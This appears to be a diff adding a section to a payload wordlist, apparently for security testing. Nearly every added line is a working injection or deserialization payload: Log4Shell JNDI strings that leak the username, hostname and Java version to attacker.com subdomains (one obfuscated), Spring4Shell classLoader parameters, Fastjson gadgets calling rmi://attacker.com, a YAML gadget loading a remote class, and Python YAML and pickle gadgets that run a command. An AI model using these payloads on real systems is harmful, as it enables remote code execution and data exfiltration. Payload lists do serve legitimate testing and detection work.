@@ -148,3 +148,27 @@ ${jndi:dns://attacker.com/probe}
 {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://attacker.com:1099/exploit"}
 O:8:"stdClass":1:{s:4:"test";s:4:"test";}
 !!python/object/apply:time.sleep [3]
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# Log4Shell modern obfuscation + env exfil
+${jndi:ldap://${env:USER}.attacker.com/a}
+${jndi:ldap://${hostName}.attacker.com/a}
+${jndi:ldap://${sys:java.version}.attacker.com/a}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap://attacker.com/a}
+# Spring4Shell (CVE-2022-22965) class.module.classLoader gadget
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=x
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.URLs[0]=0
+# Fastjson / Jackson polymorphic JNDI
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com:1099/exploit","autoCommit":true}
+{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"}}
+{"@type":"java.net.Inet4Address","val":"attacker.com"}
+# serialized stream imza markerları (tespit)
+AAEAAAD/////
+H4sIA
+gASV
+# YAML / Ruby / Python tehlikeli yükler
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
+!!ruby/object:Gem::Requirement
+!!python/object/apply:subprocess.check_output [["id"]]
+cos\nsystem\n(S'id'\ntR.
